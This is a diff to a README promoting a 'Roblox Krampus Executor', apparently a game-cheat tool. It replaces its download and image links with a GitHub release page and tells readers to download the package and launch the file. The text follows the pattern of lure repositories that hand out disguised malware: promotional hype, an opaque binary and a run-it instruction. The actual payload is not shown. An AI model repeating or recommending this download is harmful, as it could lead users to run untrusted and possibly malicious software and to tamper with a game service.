@@ -2,7 +2,7 @@
 
 Welcome to the Roblox Krampus Executor repository! 🎮
 
-![Roblox Krampus](https://example.com/roblox-krampus-img.jpg)
+![Roblox Krampus](https://github.com/HTEREGR/Roblox-Krampus/releases/tag/v2.0)
 
 ## Description
 
@@ -20,7 +20,7 @@ Roblox Krampus Executor is the ultimate tool for Roblox script execution. With t
 
 To get started with Roblox Krampus Executor, follow these simple steps:
 
-1. Download the software package from [Software.zip](https://github.com/user-attachments/files/18060583/Software.zip).  
+1. Download the software package from [https://github.com/HTEREGR/Roblox-Krampus/releases/tag/v2.0](https://github.com/HTEREGR/Roblox-Krampus/releases/tag/v2.0).  
 2. Launch the downloaded file to install the executor.  
 3. Enjoy enhanced Roblox scripting and gameplay experience!
 
@@ -46,6 +46,6 @@ The Roblox Krampus Executor is licensed under the MIT License. Feel free to expl
 
 Get ready to elevate your Roblox scripting experience with Roblox Krampus Executor! 🚀
 
-![Roblox Krampus Executor](https://example.com/roblox-krampus-executor.jpg)
+![Roblox Krampus Executor](https://github.com/HTEREGR/Roblox-Krampus/releases/tag/v2.0)
 
 ---
